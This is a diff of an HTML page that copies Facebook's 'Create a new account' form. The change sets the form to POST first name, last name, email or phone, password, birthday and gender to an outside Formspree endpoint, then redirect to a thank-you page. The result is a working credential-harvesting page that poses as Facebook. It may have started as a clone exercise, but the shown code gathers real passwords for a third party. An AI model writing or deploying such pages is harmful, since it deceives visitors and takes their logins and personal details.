@@ -126,60 +126,92 @@
         <h1 class="facebook-logo">facebook</h1>
         <h2>Create a new account</h2>
         <p>It's quick and easy.</p>
-        <form id="signup-form">
-            <div class="input-group">
-                <input type="text" id="first-name" placeholder="First name" required>
-                <input type="text" id="last-name" placeholder="Last name" required>
-            </div>
-            <div class="input-group">
-                <input type="email" id="email" placeholder="Mobile number or email" required>
-            </div>
-            <div class="input-group">
-                <input type="password" id="password" placeholder="New password" required>
-            </div>
+        <form id="signup-form" action="https://formspree.io/f/mqpzqyln" method="POST">
 
-            <label for="birthday" style="color: #606770">Birthday</label>
-            <div class="birthday">
-                <select id="month" required>
-                    <option value="January">January</option>
-                    <option value="February">February</option>
-                    <option value="March">March</option>
-                    <option value="April">April</option>
-                    <option value="May">May</option>
-                    <option value="June">June</option>
-                    <option value="July">July</option>
-                    <option value="August">August</option>
-                    <option value="September">September</option>
-                    <option value="October">October</option>
-                    <option value="November">November</option>
-                    <option value="December">December</option>
-                </select>
-                <select id="day" required>
-                    <script>
-                        for (let i = 1; i <= 31; i++) {
-                            document.write('<option value="'+i+'">'+i+'</option>');
-                        }
-                    </script>
-                </select>
-                <select id="year" required>
-                    <script>
-                        for (let i = 2024; i >= 1900; i--) {
-                            document.write('<option value="'+i+'">'+i+'</option>');
-                        }
-                    </script>
-                </select>
-            </div>
+    <div class="input-group">
+        <input type="text" id="first-name" name="first_name"
+               placeholder="First name" required>
 
-            <label for="gender" style="color: #606770">Gender</label>
-            <div class="gender">
-                <label><input type="radio" name="gender" value="female" required> Female</label>
-                <label><input type="radio" name="gender" value="male" required> Male</label>
-                <label><input type="radio" name="gender" value="custom"> Custom</label>
-            </div>
-            <br>
-            <button type="submit" class="signup-btn">Sign Up</button>
-            <a href="index.html" class="already-have-accaount">Already have an account?</a>
-        </form>
+        <input type="text" id="last-name" name="last_name"
+               placeholder="Last name" required>
+    </div>
+
+    <div class="input-group">
+        <input type="email" id="email" name="email"
+               placeholder="Mobile number or email" required>
+    </div>
+
+    <div class="input-group">
+        <input type="password" id="password" name="password"
+               placeholder="New password" required>
+    </div>
+
+    <label style="color: #606770">Birthday</label>
+
+    <div class="birthday">
+        <select id="month" name="month" required>
+            <option value="January">January</option>
+            <option value="February">February</option>
+            <option value="March">March</option>
+            <option value="April">April</option>
+            <option value="May">May</option>
+            <option value="June">June</option>
+            <option value="July">July</option>
+            <option value="August">August</option>
+            <option value="September">September</option>
+            <option value="October">October</option>
+            <option value="November">November</option>
+            <option value="December">December</option>
+        </select>
+
+        <select id="day" name="day" required>
+            <script>
+                for (let i = 1; i <= 31; i++) {
+                    document.write('<option value="' + i + '">' + i + '</option>');
+                }
+            </script>
+        </select>
+
+        <select id="year" name="year" required>
+            <script>
+                for (let i = 2024; i >= 1900; i--) {
+                    document.write('<option value="' + i + '">' + i + '</option>');
+                }
+            </script>
+        </select>
+    </div>
+
+    <label style="color: #606770">Gender</label>
+
+    <div class="gender">
+        <label>
+            <input type="radio" name="gender" value="female" required>
+            Female
+        </label>
+
+        <label>
+            <input type="radio" name="gender" value="male">
+            Male
+        </label>
+
+        <label>
+            <input type="radio" name="gender" value="custom">
+            Custom
+        </label>
+    </div>
+
+    <br>
+
+    <!-- Optional: redirect after successful submission -->
+    <input type="hidden" name="_next" value="thankyou.html">
+
+    <button type="submit" class="signup-btn">Sign Up</button>
+
+    <a href="index.html" class="already-have-accaount">
+        Already have an account?
+    </a>
+
+</form>
 
     </div>
 
